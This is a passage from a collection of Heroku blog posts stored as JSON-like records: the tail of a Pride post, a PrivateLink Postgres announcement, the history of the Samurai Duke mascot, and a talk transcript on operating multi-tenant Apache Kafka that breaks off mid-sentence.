equality and justice.\" — Stella Cotton \"Everyone should have the right to introspect, embrace, and share who they are and how they want to live. To me, Pride is a way to support and celebrate that right.\" — Raul Murciano \"Pride is both a sad and smile inducing time for me. Sad because I read, for example, a history of the events at Stonewall and feel that the exact same oppression is happening today just in different contexts: transgender people in the U.S military , gerrymandering in the US , the Rohingya people in Myanmar. Why are we so bad at learning from others’ histories? Why do we keep making the same mistakes? What prompts a person to oppress another? Some difficult questions that all of us should spend some time thinking about. But then I stepped outside today, Sunday, June 30, to NYC’s Pride Parade (115 thousand marchers participating and millions watching) and am overjoyed to see so much positivity and compassion. So many smiles and celebrating humans — humans of all colors and shapes and sizes and countless unseen differences. We’re getting there. We can do this, humanity. Don’t give up on love...\" — Chris Castle \"Every Pride to me represents another inexorable step forward, toward a better version of us, of humanity. There will be stumbles, there will be scraped knees and worse, sometimes much worse. But as we march, and as the parades and celebrations grow and flourish, so do my LGBTQ friends and family members. Pride allows us all to see them not just as themselves as they truly are--which is magnificent--but as their best selves. Pride to me represents hope that the world will continue to become more compassionate and accepting, and I'm honored to be even the smallest part of that.\" — David Routen values pride", "date": "2019-07-01,"},
{"website": "Heroku", "title": "Heroku Postgres via PrivateLink Is Now Generally Available", "author": ["Scott Truitt"], "link": "https://blog.heroku.com/heroku-postgres-privatelink", "abstract": "Heroku Postgres via PrivateLink Is Now Generally Available Posted by Scott Truitt May 22, 2019 Listen to this article Today, we're thrilled to announce Heroku Postgres via PrivateLink, a new integration that enables customers to seamlessly and securely connect Heroku Postgres databases in Private Spaces to resources in one or more Amazon VPCs. Heroku Postgres via PrivateLink connections are secure and stable by default because traffic to and from Heroku Postgres stays on the Amazon private network; once a PrivateLink is set up, there is no brittle networking configuration to manage. As always, security and trust are top of mind with everything we do at Heroku. The ability to configure Heroku Postgres via PrivateLink is already enabled on all private Postgres plans. It's also included at no additional charge and available in all six Private Spaces global regions. Built for the Next Generation of Data-driven Development App architectures are increasing in complexity. The number of data sources and use cases is growing too. Likewise, the ecosystem of solution components is expanding in depth and breadth. What's missing is a way to securely and seamlessly integrate these app and data resources. Heroku Postgres via PrivateLink allows customers to use data and resources in both Heroku and AWS. This makes Heroku Postgres an even more powerful presence in distributed app architectures: Developers can now create more scalable and secure external connections to Heroku Postgres. Avoid the time-intensive, non-scalable process of hardcoding trusted allowlist IPs, managing an internet gateway, and configuring firewall proxies. Developers can now build more sophisticated app architectures that combine resources running on Heroku and AWS. Anything that runs in an Amazon VPC is now accessible to Heroku Postgres via PrivateLink. Developers can now access complimentary AWS resources for use cases like OLAP, archive, and more, all directly from Heroku Postgres. These same AWS resources can write back to Heroku Postgres to enrich and increase the value of CRM data. Extending the Value of Heroku Postgres Heroku Postgres sits at the heart of most apps deployed on Heroku because it's deeply integrated with three key developer workflows: First, the “app plus Postgres database” integration is the original design pattern that drove the first decade of cloud development. It remains a key driver in helping developers scale from an emerging startup to a high-growth company to a massive enterprise on Heroku. Second, the Salesforce CRM data integration with Heroku Postgres is the next design pattern that enables developers to build highly-personalized apps and experiences. The bi-directional sync of Heroku Connect makes it possible to securely and seamlessly work with and enrich Salesforce CRM data in Heroku. Finally, the Heroku Postgres via PrivateLink integration is the emerging design pattern that unlocks an ecosystem of data resources. With this release, we are providing customers greater architectural choice for building data-centric applications. We are looking forward to more integrations on the way. Integrate in Four Steps The entire process takes about 20 minutes for resources to be created on Heroku and AWS: Start with a Heroku Private Space , an app running in it with an attached private Heroku Postgres database, and an Amazon VPC. On Heroku, create the PrivateLink endpoint on your Heroku Postgres database and associate it with your AWS Account ID. That's it. Choose from the CLI or Heroku Dashboard. On AWS, configure the security group, create the PrivateLink endpoint in your VPC, enter the Service Name created in step two, and apply the security group. On AWS, find the VPC Endpoint connection URL and the corresponding connection string for your Postgres database. You can now use this connection string to connect the applications in your Amazon VPC to your private Heroku Postgres database. Feedback Welcome We hope you enjoy using this new feature as much as we enjoyed building it, and we can't wait to see what you do with it. Existing Heroku Enterprise customers can get started today . For more information on Heroku Postgres via PrivateLink, see the Dev Center article , or contact Heroku. Please send any feedback our way. VPC PrivateLink AWS Amazon postgres Heroku Postgres Heroku Enterprise", "date": "2019-05-22,"},
{"website": "Heroku", "title": "Samurai Duke and the Legend of OpenJDK", "author": ["Joe Kutner"], "link": "https://blog.heroku.com/samurai-duke-and-the-legend-of-openjdk", "abstract": "Samurai Duke and the Legend of OpenJDK Posted by Joe Kutner July 09, 2019 Listen to this article What is Duke? No one knows his species or genus. People say he’s a Java Bean or a Software Agent, but all we know for sure is that he reminds us of the more than twenty-year legacy of the Java language and its community. The Java community has such an affinity for Duke that designers have created surfing Duke, astronaut Duke, rockstar Duke, macramé Duke, and of course Heroku’s Samurai Duke. But how can all of these Duke variants exist without violating copyright or trademark laws? After all, Duke represents the language at the middle of one of the fiercest copyright battles in the history of software . The answer, it turns out, can teach us a great deal about how to nurture an open source community. Java’s history is filled with ups and downs, rights and wrongs, plaintiffs and defendants, and a whole lotta XML. And just as those who don’t read history are doomed to repeat it, learning about Java’s past might help you grow the communities and products you contribute to--even if you’re only reading about a mascot. The Origin Story Duke was created in the earliest days of Java by Joe Palrang, an artist who helped animate films including Shrek and Over the Hedge. At the time, Duke was the property of Sun Microsystems and was as proprietary as Java itself. But Duke was poised to lead Java’s charge into a brave new world. In 2006, Duke was open-sourced under a BSD license, which coincided with the release of the Java HotSpot virtual machine and compiler under the GNU GPL license. This was the first subset of a truly open source Java, and Sun Microsystems promised that the rest of the JDK would be released under the GPL within the next year. Duke, already the mascot for Java, became the herald of a new future where Java could be freely distributed--just like Duke could be freely customized by designers. A completely free and open source Java may seem inevitable today, but fifteen years ago there was no certainty in the matter. Sun was struggling to make money despite producing some of the most innovative technologies in the industry, and giving their most successful product away for free seemed unrealistic. As the decade came to a close, Sun was acquired by Oracle and the first Java release under new ownership, JDK 7, was also the first in which the reference implementation was free and open source under the GNU GPL License. Today, there are multiple OpenJDK distributions and the open Java ecosystem is thriving--along with Duke. That’s why Heroku, who has always supported a freely distributable version of OpenJDK, knew exactly where to look when it needed a logo for its Java product. The Way of Samurai Duke Actually, Duke was not Heroku’s first choice for a logo (sorry Duke). The story of how Duke became a Samurai is shrouded in mystery, intrigue, and lawyers. The famous Java coffee cup with steam rising from it (which we are not allowed to show here) was the first logo Heroku tried. But our lawyers informed us that we were violating Oracle’s license on that image. For once, lawyers did us a favor. By taking the coffee cup option away, they forced us to think harder about what Heroku Java should look like. We thought of Duke, but a plain-old naked Duke just wasn’t exciting enough for Heroku’s standards. We decided to dress him up and in classic Heroku style, so we gave him a Samurai outfit. Initially, Samurai Duke had a samurai sword in his belt, but our corporate team informed us that it was too violent and had to be removed. The end result is a cute, non-violent Samurai Duke, whom we love. Heroku has long been the ally of a free and open Java and the OpenJDK project. Samurai Duke is our metaphorical protector of that freedom. The next time you see Heroku at a conference, be sure to say hello and ask for one of our Samurai Duke stickers. Or grab a copy of our Samurai Duke wallpaper . You’ll be helping us celebrate Java and open source. OpenJDK Samurai Duke Duke java", "date": "2019-07-09,"},
{"website": "Heroku", "title": "How Heroku Operates its Multi-Tenant Apache Kafka Services", "author": ["Ali Hamidi"], "link": "https://blog.heroku.com/how-heroku-operates-its-multi-tenant-apache-kafka-services", "abstract": "How Heroku Operates its Multi-Tenant Apache Kafka Services Posted by Ali Hamidi July 11, 2019 Listen to this article This blog post is adapted from a talk given by Ali Hamidi at Data Council SF '19 titled \" Operating Multi-Tenant Kafka Services for Developers on Heroku .\" Hi. Welcome to Operating Multi-Tenant Kafka Services for Developers. This is the agenda for the talk. I'm going to give you a little intro about myself and Heroku and Heroku Data. We're going to look at the motivation behind building the multi-tenant Kafka service in general, take a look at our existing single-tenant Kafka, compare that with multi-tenancy and what the multi-tenancy implications are, and then we'll go into some of the configuration changes that we made and some of the tuning that we did. Talk a little bit about testing and then hopefully cover automation, which is kind of our thing, and discuss some of the limitations that were necessary as a result of making a multi-tenant service. I am Ali Hamidi. I am an engineer on the Heroku Data team at Salesforce. Heroku is a cloud platform that enables companies to build applications in a variety of languages, deploy it on our platform and actually it helps them to run it, scale it, monitor it. Heroku Data specifically is the team at Heroku that provides the data services on top of it. We provide Heroku Postgres, Heroku Redis and Kafka, of course. A brief about Kafka. Hopefully many of you are aware of it already. Kafka itself is an Apache project. It's a distributed streaming platform. It provides the pub/sub model. In Kafka parlance it's produce and consume, so you produce the cluster and you consume from it. It's a durable message store so on disk it's an ordered commit log and it's highly available. You have multiple brokers that can hold multiple replicas of your data. If a single broker goes down, you still have replicas and it will failover and you continue. What is Apache Kafka on Heroku specifically? We provide a fully managed service, so it's more of a batteries included approach. It's opinionated in the sense that in cases where there are multiple configuration options we make a decision based on what we feel is a safe or productive default and we provide that out of the box. It's configured for best practices for most users. I put a little asterisk because there's no, we can't make one size fits all. There are bound to be use cases that aren't really well-suited, but we try to cover as many as possible and try to get the largest coverage as possible. I want to talk a little bit about the use cases for Kafka in general. Why would you use Kafka and not some other data store or other streaming service? I'm going to cover a couple of use cases and then look at specific customers that were on Heroku that used Heroku Kafka. One of the ones I'm going to look at is decomposing a monolithic app. In this case we're taking a big monolith and we're using Kafka as a transport medium or interconnect between the various services or microservices to transport information and events between them. Another use case that I'm going to cover is processing high volume, real-time data streams. You may have something that is naturally a stream of events, like currency information or events coming from an IOT device or whatever it is, and you just have a torrent of data that you're collecting from various sources and you want to make real-time decisions on those. The third use case I'm going to cover is providing real-time event-driven architecture. This is pretty similar to the second case, but essentially you have a number of disparate services that are producing events and you're trying to make decisions on some kind of aggregate of that data. You have a number of sources, they're all telling you different things and you want to make real-time decisions on what you should be doing. For the first case, decomposing the monolith, I'm going to talk a little bit about SHIFT Commerce. You can actually read about it, they have a blog post on the Heroku blog that talks about it. They basically leveraged Heroku Kafka as a path to gradual migration from a monolith into a microservice. Essentially what they did was they introduced the ability for their monolith to produce events into Kafka and then gradually over time they introduced more and more services that consume those events and moved the logic out of the monolith into those new microservices. For the second use case I wanted to talk a little bit about Quoine, it's pronounced coin. Quoine is a fintech company based out of Singapore and they mostly deal with cryptocurrency exchanges and mostly active in Japan. Essentially they have a huge torrent of pricing data for cryptocurrencies coming from a number of different exchanges and they aggregate them and make decisions in real-time on what to do and how the prices affect their decisions. The last use case I want to cover is Caesars Entertainment of casino fame and other things. Essentially they use it to ingest and aggregate a large amount of customer data from lots and lots of different sources and they use it to make decisions on how best to provide services or offers or deals to their most prized VIP customers. These are very different systems, all producing events. They aggregate, they process them, they try to make decisions on how best to serve their customers. I want to talk a little bit about the motivation, why bother building a multi-tenant Kafka. We already have a relatively successful dedicated Kafka product. These are some of the motivations behind it, some of the goals. Right now our single-tenant Kafka starts at $1,500 for the base plan, which is the standard zero. With that you get three brokers and five ZooKeepers, which is kind of pretty standard for our ZooKeeper topology. 1,500 could be relatively reasonable for you, but we want to lower that barrier, we want to make it much easier to access. If you're working in development, you haven't really finished your product yet, that might be too high a barrier for you and so targeting development, testing, low-volume production, we want to introduce something that's a little bit more accessible. Our multi-tenant plans right now start at a $100, so that's quite a substantial reduction. Here's the blog post when we announced it. It's September 14, 2017. We've had multi-tenant Kafka for quite a while. I want to talk a little bit about the differences, single-tenant versus multi-tenant and what it looks like. Single-tenant is pretty obvious. We have one customer or one tenant that has access to the entire cluster and so your security boundaries or your resource boundaries are really outside of the cluster, everything in the cluster is yours. This is really what it looks like. When you talk Kafka you're really dealing with topics. All of the topics are owned by a single customer, you don't really need to worry about any isolation at that level. With multi-tenancy it kind of looks like this. We have a large number of customers all residing on a single Kafka cluster. That introduces a whole range of new issues that you need to tackle. I know this is kind of a wall of text but I'm going to break it down and talk about each one separately. We talk about resource isolation, we talk about parity, compatibility and costs related to it. I'm going to focus on resource isolation first and talk about security implications, performance implications, and safety. When I talk about security, what I really mean is a tenant should not be able to access another tenant's data. This is kind of table stakes for multi-tenancy. It would be kind of a disaster if we put everyone on the same cluster and everyone could read everyone else's data. The priority, the main thing, is this should not happen. You shouldn't be able to read other people's data. With Kafka, because we actually talk about topics all the time, this is really what we mean. User A shouldn't be able to read User B's topics. How do we do that? Kafka itself has native support for access control lists, or ACLs. It's a somewhat relatively new feature in Kafka life, but essentially what it allows you to do is specify User A can carry out action B on resource C. User A can read or describe or write topic messages, which is owned by User A, but there is no explicit ACL for allowing it to read anything of User B so it can't. The other thing we do is namespacing. This is something that's somewhat unique to us in that we namespace resources per tenant. When you create a new multi-tenant Kafka add-on on Heroku, we automatically generate a name, in this case wabash-58779. We pick a river, dash, some numbers and that becomes the prefix for all of your resources. You create the topic messages, you get Wabash whatever it is, dot messages. That also applies to the consumer groups and that's actually what we apply the ACLs to. Any topic that begins with wabash whatever is owned by tenant A. Anything that has a different prefix is owned by another tenant. The second aspect that I want to look into is performance and what I mean here is really this: a tenant should not adversely affect another tenant's performance. This is typically what we refer to as the noisy neighbor. You're sharing a cluster with someone, they're super active, they're absolutely hammering their broker and your performance goes down the toilet as a result of it. Obviously that sucks for everyone, except for the person who's abusing the resources, and so we want to prevent that. In the case of Kafka, Kafka has support for quotas. That's super cool, it's really useful. It allows you to specify a produced quota and a consumed quota in terms of bytes per second. We say Tenant A can have 256 kilobytes per second produced and 1 megabyte per second of consumed, and Kafka itself enforces that. I'll talk a little bit later about the way that's enforced because it's kind of interesting. The third part of resource isolation is safety. Here what I actually mean is a tenant should not jeopardize the stability of the cluster. We don't want a single tenant who does something unusual or has a misbehaving client to take down the cluster for everyone else. In order to prevent that we apply limits. We can apply limits to topics, and by that I mean the number of topics, and by association the number of partitions, which is really the thing that scales on Kafka. The number of consumer groups, storage, and throughput. I want to talk a little bit more about storage because it's kind of interesting. Kafka's concept of storage is more of a transient thing. Messages live on the Kafka cluster for a certain amount of time but they don't live there forever. It's not a source of truth for your data forever. Thinking of it in terms of static storage is a little bit strange so instead we think of it as capacity and this is a term that we use in all of our documentation. Essentially that's a function of a message throughput multiplied by the retention on all of those messages multiplied by the replication. If I do a hundred messages per second and I have a one-day retention and I want three replicas of it and you multiply that all together and that's actually the total amount of storage you're using across the cluster. And then there's the throughput itself, which I covered with quotas. Imposing these limits is cool. Some of them are natively supported within Kafka, so you can specify quotas or ACLs to do certain things. Storage is something that we covered with the capacity, which is a slightly more complicated function. But we need to be able to monitor it. We actually need to be able to look at this and say, are these limits being exceeded? Are they being adhered to? In particular with storage, the way it works in our case is that we allow you to grow the storage on the cluster so use of another cluster we give you 100 gigabytes of storage. You start putting data into it and you get close to the hundred gigabytes, we actually grow it automatically for you. We don't take down your cluster because you hit your limit, we have a pretty generous grace area where we will increase the storage and let you continue. That's great for the customer, but we aren't really doing you any favors by allowing you to grow unbounded, so we actually have to monitor it. We check occasionally to see, are you still within the limits? Are you nearing a dangerous limit? Monitoring is kind of key to that, but then more so than just monitoring is actually being able to enforce the limits. Some of them are nice because they're natively supported in Kafka, but in the case of storage, if our automation automatically grows the volumes then you can just keep growing forever and eventually the cluster will topple over and so we actually have to have a mechanism for enforcing it. In the case of cast Kafka multi-tenant, we'll send you an email saying, hey you've exceeded your storage by 150%, you should probably slow it down or upgrade your plan. If you keep going past it then we impose an additional, more aggressive throttling to slow your growth and get you back under the limit. If you just fly past it for an extended period of time we actually block access to try to let it clear out and then we'll enable it again. Another area of multi-tenancy which is specific to multi-tenancy is parity. Here we're talking about feature parity as well as behavior parity. I say parity, but what I really mean is for the service to be useful it needs to behave like a normal cluster. There's no point in us giving you something that looks and behaves in a way that's totally unlike Kafka because you could code against it and you could deploy your application against it and it works fine, but then you switch to regular Kafka and everything breaks and it just doesn't do what you think it does. In order to address this, we actually give you access to what is effectively a standard Kafka cluster. It looks very much like our dedicated clusters, it's the same number of brokers, it's the same number of ZooKeeper nodes, it behaves in exactly the same way. One of the things that we thought about is that we could have gone with a single broker, single ZooKeeper option and that would have been pretty cost-effective and we could do it quite easily, but then the customer would be developing against something that's not really representative of real life. Nobody would deploy a production Kafka cluster with one broker and one ZooKeeper and so you won't have exposure to things like rolling restarts or when topics failover and all that stuff. Your application might work fine with only one, but then once you switch to a real cluster which has eight brokers and they start failing over and things start moving around, your application breaks. We actually give you access to something that represents what a real production cluster would look like, so if you do move then your application is ready for it. There are some limitations. We have to make some compromises in order to provide the level of safety that I mentioned earlier. As much as possible we try to keep it standard, but there's going to be some things that we have to change. Compatibility is the next thing I want to talk about. In this case what I really mean is the service needs to support standard clients, no vendor lock-in. That's absolutely a core part of Heroku's belief and we only use opensource Apache Kafka. It's not a custom fork, there's no weird custom code required on the client side, there's nothing strange that we do in order to enable this. We use absolutely standard clients and whatever your favorite language is and you can connect to it and use it. That's kind of a big thing for us and it applies to all of our data services really. The last implication I want to talk about is costs, and specifically costs of resources and operational costs. What does it cost to run for the things that we run, like VMs and instances. Plus, what does it cost us to actually operate it? Here we're talking about the service needs to be financially feasible and in this case I'm actually talking about our costs, not so much the cost for the customer, although they're obviously related. Here, the things that go into the resource costs would be packing density. How many tenants do we pack on this cluster? Conversely, but somewhat related, is the utilization of that cluster. How well-utilized is it? The more utilized it is the more efficiently we're spending our money on these resources. But with that comes a few sort of interesting cases where we have consciously made a decision to take a hit on our part in order to provide certain functionality. When we look at cluster size, we have some options. We could have one massive cluster with hundreds of brokers and pack all of the tenants onto there, or we could have very, very small clusters like one broker, one ZooKeeper. There are some decisions there where there are implications related to the way it performs, the way failovers work. There is a sweet spot for cluster size and we have actually already done this process. We've looked into this, we did all the testing when we looked at the single dedicated plans and we settled on a maximum of eight brokers and five ZooKeepers because of the way it behaves and so we kind of favor that. We also insisted pretty early on that we don't over-provision. When we tell a customer you're signing up for a particular plan, we make sure that they have all those resources and so we don't over provision in any way. Again, if we say we're going to pack 20 customers onto a cluster and they all join on with the lowest plan, then our utilization is pretty low. That sucks from a resource cost but it's great from the customer point of view because now they have the resources that they expected. Also we wanted to provide seamless upgrading. The idea is a customer can join on with the lowest plan and they should be able to upgrade to the next plan up or the biggest plan that we have for multi-tenant without any disruption. Unfortunately when it comes to Kafka there is no easy way to actually migrate offsets. If you move from one cluster to the other, the offsets aren't really translatable in that sense. In order to get around this, we have to assume the worst case or the best case, depending on your perspective, that every customer could potentially upgrade to the biggest plan and so inherently our utilization is pretty low. When it comes to operational costs, this is kind of an area that we want to focus on because this is the amount of man-hours that we sink into it. We're not a huge team so this kind of makes a big difference for us. We want to minimize the operational burden and minimize the impact or the blast radius of particular issues. Again, going back to the cluster size, if we had one massive cluster with a hundred brokers and there was a cluster-wide issue, then that could potentially affect hundreds or thousands of customers. Again, we fall back into the sweet spot of saying, if we have clusters that are eight brokers and we pack 25, 30 tenants onto it, then we can kind of minimize the blast radius into a particular area. Minimizing operational costs, again, if we match the single tenant clusters in the topology, then we can actually share the learnings between them. All of the gained knowledge and experience from operating a fleet of three- and eight-broker clusters, we actually map immediately and so we find a bug in one topology or one behavior, one performance tuning that works on one, we can immediately map it over to the multi-tenant without really any loss. Some of the other ways that we kind of reduced the operational burden for us is that we picked safe defaults. It's possible to put yourself in an unfortunate situation by picking settings that are not ideal. If you think about the situation where you create a topic and you set replication to one, which was the default in lots of clusters. The customer creates a topic and they start writing things to it and we failover that broker, well what happened to the data? It only resided on one and so now it's gone forever. That sucks for the customer and maybe they weren't aware of it or maybe they assumed that a sane default was used, so we actually enforce that. We picked those safe defaults both to provide a better user experience but also to reduce the operational burden for us. As I mentioned, we pick similar clusters that are dedicated so we can share those learnings and we do a ton of automation. Automation, it's kind of our thing, that's like an epic understatement. We are a very small team and we manage millions of databases and data services. Millions, without exaggeration, that's actually what we do. We did a ton of testing. We did a huge amount of testing on the multi-tenant topologies, different size Kafka clusters, different configurations, different releases, all sorts of stuff in order to arrive at a configuration that we think is pretty sound and pretty solid and that all feeds back into reducing operational costs for us. I want to talk a little bit about configuration and tuning and sort of talk a little bit about some of the changes that we made, some of the configurations that we did in order to achieve what we aimed to do and what we actually have running in our multi-tenant fleet. I'm going to cover partitions, the number of partitions, what they look like. Quotas, how those work. Topics in consumer groups specifically, how they're created and the idea of guardrails. This is something that we implement to make it better for customers to run on Heroku. Partitions. We have tested and we set a very, very large number of partitions for Kafka. For the most part the industry average is maybe one or two thousand partitions per broker, that's kind of like the rule of thumb. We are at close to 6,000 and it's unusually high but this is kind of the trade-off that we make for being able to pack so many tenants and give them the freedom to create the number of topics that they want or they need and the number of partitions per topic that they need. In order to support a large number partitions, we actually have to tune the max number of file descriptors and so all of our clusters run at 500,000, which again is pretty atypical, it's unusually high for brokers of this size, but again this is through our extensive testing we've arrived at this number and we know it's a safe number for these clusters. Similarly, we've increased the max memory and mmap count to 500,000. If you look at most Kafka docs they'll tell you increase it, but to what is kind of up in the air it really depends on your usage. I want to cover quotas a little bit because this is kind of an unusual implementation. KIP-13 introduced quotas in 0.9 and something that's kind of counterintuitive, both the enforcement and the way it's implemented in the first place, is that quotas are actually implemented per broker and so if you think about this, if I set a one megabyte per second produce quota on Kafka using the CLI commands, what I'm actually getting is 1 megabyte per broker. If I think, oh I've given my customer 8 megabytes and then I double the size of my cluster, I've actually given them now 16 megabytes. It's not really calculated across the cluster and if you look at the documentation they basically say it's easier to implement it this way. The quotas documented are actually the cluster-wide aggregate. The enforcement for produced quotas is super counter-intuitive and actually called out a few times, but the way it works is that when you produce to a Kafka it sends you back a response saying, okay I got it, it's been written. When the quota is in effect and you've exceeded your quota, it actually does all the work. It accepts your message, it writes it to the commit log, it sends it off to all the brokers that are replicating, but then it just waits to respond to you. The idea is this introduces backwards compatibility. Even if your client doesn't know anything about quotas it should, if it's a well-behaved client, wait for the ack before it tries to produce more. In reality, many Kafka clients are not well-written or don't really adhere to this behavior and they'll just keep throwing more data at it and the Kafka broker will happily accept it, so it will just keep accepting as much data as you send it and just won't respond to you, but if your client doesn't care it will just keep continuing and so you end up with this case where it's sort of like the honor-based implementation of quotas. It's like you really shouldn't me anything and then you just do and it just accepts it. This actually led to another issue that we uncovered, but I'll cover that in a little bit. So yeah, if you are using Kafka and you're already using produced quotas, that's something to keep in mind. With topics in consumer groups, this is kind of an unfortunate side effect of unfortunate necessity in the way we implemented multi-tenancy and that there is no way in Kafka, even with ACLs, to specify a numeric limit to the number of topics. We can't say User A can create 40 topics and 200 partitions, the ACLs don't have that kind of granularity. In order for us to impose those limits, instead we actually split the control plane from Kafka and Heroku. The idea is we removed the ability to create topics dynamically through the admin APIs and instead we forced the customer to go through the Heroku API in order to create these topics. That gives us the gateway, the entry point, in order to enforce this limits. For the most part that's not really an issue. Most of our users wish that they could dynamically create topics in consumer groups, but in reality it's not really a blocker in most cases. The last sort of major topic in configuration that I want to cover is guardrails. The idea here is to limit potential bad usage. Customers may use clients that are poorly written because their language doesn't have a great supported client or they may mis-configure the client in a way that introduces bad behavior that could cause instability or other performance issues. There's this quote which I've heard many times in Heroku, but I'm actually not sure who said it initially, but essentially it's, \"Customers don't make mistakes, we make bad tools.\" The idea is if we give the opportunity for a customer to make a mistake and behave badly then it's actually on us. We shouldn't have let him do that. Wherever possible we try to build in these guardrails. We try to put things in place to prevent customers from making mistakes, essentially. Some of the configurations that we have are on the Heroku data plane side that we actually enforce is minimum retention time. This is something that customers often ask about because it seems kind of weird. Why are you telling me that I should keep data around for at least this long? It seems kind of like a bizarre thing for us to enforce, but through our testing, and if you look through the mailing lists, anything less introduces a lot of turn on the broker and so you're basically wasting cycles, wasting IOPs, throwing out data that you could be doing something productive with. We found that 24 hours is kind of The sweet spot. Most customers ask us why is that the minimum, but it's almost never an issue. We have a max retention time for our multi-tenant plan of seven days. We have a default replication factor of three, a minimum replication factor of three and a maximum replication factor of three. This should tell you that really you should have a replication of three, we don't allow anything else. This is one of the more significant guardrails that we have in place. Some of the defaults in Kafka would not necessarily have three, you would create a topic and it just gives you one replication and weird things start happening, and so we strictly enforce three. Within Kafka itself we've also changed the defaults, again to make them a little bit more sane, more safe. The default number of partitions we set is eight, the default for Kafka itself is one. With one you aren't gaining any of the benefits of scale, that will only reside on a single broker and your performance will be basically pinned to a single broker's worth of throughput. If you remember what I mentioned about quotas, essentially quotas are enforced per broker so if you create a one-partition topic and your quota is 128K, the maximum throughput you'll ever get through it is 128K because it's all going through one broker. We default to the same number of brokers in the cluster. Again, replication of three, we're pretty serious about it. If you missed it the first time, we're going to get it the second time. It's going to be three. Min in-sync replicas, if you're not familiar with how this works is essentially on the Kafka broker you can specify the number of confirmed writes from replicas before you write back to the client and you say, \"I have received this message.\" Previous releases of Kafka had it set to one, or I think it may have been zero actually, so just the receiving broker says, \"I have got this message,\" and then the client would think, \"Great, I've written it, I should continue with my life.\" And then that broker dies and you've lost all your messages, and so it's kind of confusing and counterintuitive. Our default is set to two and most recent versions of Kafka actually have it to two as well. A little bit about monitoring at Heroku. We use a custom monitoring tool, it's called Observatory, it's pretty awesome. It's agentless in the sense that one of the core beliefs of Heroku Data and for its monitoring is that all monitoring should be done from the outside in. We don't actually deploy anything in the brokers or on the containers or on the services themselves. What that gives us is this amazing power where through support or through on-call we discover, oh actually there's this thing, there's this metric that we should be monitoring and we aren't. We basically teach our monitoring tool how to look at that thing and now that metric is being exposed across every single instance in our fleet. We pushed some code and now a million databases are now telling us something new. It's pretty spectacular, it's one of the best things that we've come up with, I think. JMX is pretty great. JMX is purely a Java thing, which is not great, but Kafka itself exposes a ton of metrics about every aspect, everything you could possibly want from your Kafka broker, JMX can tell you, but it's Java only, which sucks. Jolokia is a HTTP proxy for JMX and so when we deploy Kafka we deploy Jolokia with it and that basically allows us to reap the benefits of JMX without having to run Java on our control plane itself, or the monitoring actually. That's pretty fantastic and I highly recommend it. Testing. I mentioned we did a ton of testing. This was pretty grueling. We tested a ridiculous number of permutations on a number of partitions, maximum number of partitions. What kind of throughput should we provide for each tenant? What's the maximum that we can get looking at different message sizes? Kafka behaves very differently if you send lots of very small messages or very large messages. What about common operations? We have a huge number of partitions, we're hammering it with a million large messages and then we decided to take one of the brokers out. Does it survive that? There were some topologies where you're like yes, this is the one. It's perfect, everything works fine. And then someone says, \"Well, let's do a rolling restart,\" and then it just cascades and everything dies immediately. So yeah, we actually looked through all these failure scenarios. We would swap out a broker, we replaced one, we'd restart one. One of the servers just stops, an instance falls out from underneath us, so we tested all of those. Yeah, similarly failure scenarios. If you run on AWS things will fail; if you have a large fleet, they will fail often. We look at those cases where we decide we're running a broker and we need to attach an EBS volume, does the Kafka cluster survive that? We looked at maximum packing density, again this is kind of a function of partitions mainly. But can we fit 100 tenants? Can we fit 500 tenants? What do those look like? How does it perform? What are the implications of failing over, that kind of stuff. Bugs. Bugs was kind of a painful one. We did encounter bugs, obviously. Kafka is somewhat immature, it has a crazy development cycle, it's really actively being developed all the time. I'll cover some of those issues. But one thing which we arrived on pretty quickly, and I mentioned automation is kind of our thing, is that we want to automate testing. We developed an internal tool that leverages the internal Heroku APIs and basically simulates users. It stands up a cluster, an empty cluster, it creates 50 users and then it creates a producer and a consumer, or many producers and consumers, for these simulated users. We can actually define profiles for each user and say, we want 10% of our users to send very small amounts of traffic. We want 20% of them to send very large messages but at a very slow speed, and then we want the rest of them to do some random distribution of data. We can actually script this and it's reproducible. We release a new version, we run a new version on Kafka, we maybe tune the OS a little bit and we say, All right, go ahead and hammer this cluster.\" It will provision all the users, it will push all this data through, and then monitor it and look through the logs and say, okay this worked pretty well or we noticed that when we did a rolling restart at this point it struggled, it took too long to come up. So yeah, we automate everything, including our testing in this case. Yeah, so that was pretty cool. Bugs. We found a bug while testing Kafka multi-tenant. Specifically it affects the way the quota is enforced. It's KAFKA-4725, you can look it up. We discovered this while testing. We noticed that we would run a test and in this particular set of tests, our test was, what happens if we set quotas to one megabyte and then customers completely ignore it and they start writing at ten megabytes, what happens? Quotas looked like they were being enforced and then suddenly one of the brokers would go down and then all the other workers would go down and we were confused. We were like, what is going on? Why is this happening? We dug into it a little bit deeper and we found that there was a memory leak. The way quotas are enforced is, as I mentioned, it's delayed by ... The way they slow you down is by holding onto the response, so they don't ack your response until it's ready to do so, which would meet your quotas but essentially what that meant was they were holding onto a reference of that message, so you kept sending me data and I just keep holding on to more and more references through these messages that you sent and so memory would go through the roof, JVM would sort of kill it because you ran out of memory and the broker would go down. And then all of your traffic would shift to the other brokers and they would do the same thing and so you'd get this cascading failure pretty quickly. We found that. We contributed a PR and it was accepted and fixed in 0.10.1.1. Yeah, we're pretty active in testing new releases for Kafka, that's something we do and we always provide feedback. On the mailing list you may have seen us. Automation, it's totally our thing. Like I mentioned, we are a pretty small team and we manage millions of databases so we have to automate. Kafka does a lot in terms of maintaining these clusters, in terms of leader election and failover and that kind of stuff, but it doesn't do everything. It has no awareness of underlying instances. As I mentioned, if you're on AWS instances will fail and if you run a fleet big enough they will fail a lot. Our mantra, I guess, is to automate everything. We necessarily have to automate as much as possible. I semi-jokingly believe my job is to automate myself out of a job and so if I do a really, really good job then I will be useless and things will just run themselves. What we do in terms of automation is we have a lot of tools for cluster resizing, for replacing nodes. The automation itself looks at the cluster and says, my plan says I should have eight brokers, so if I don't have eight I should resize to get eight. We can literally go into the AWS console out-of-band and start deleting instances and our automation will go, oh there's something not right, let me bring up another node, and it will start filling them out. Storage expansion. Something that I mentioned earlier, as you write more data to Kafka, we detect, oh you're at 80% of your storage, let's expand that. We'll keep expanding it as much as you need essentially until some other part of monitoring says, hang on you've exceeded your limit by too much so we're going to do something about that. We actually automate version upgrades, so although you as a customer on a multi-tenant plan can't upgrade yourself, we automate the upgrades for the entire cluster, so it's not possible for us to manually go in and start messing around with hundreds of clusters or thousands of clusters, so we basically say, okay, now we're going to upgrade all of the Kafkas to 2.1 and the automation does it. Restarts. I put a star because it is very surprising how effective a restart is. There is the joke of, have you tried turning off and on again? That works really, really well. Actually 90% of our pages are handled automatically by automation and the vast majority of that automation is to restart a thing. It could be restart the service, it could be restart the instance. But yeah, turns out turning it off and on again tends to work really, really well, 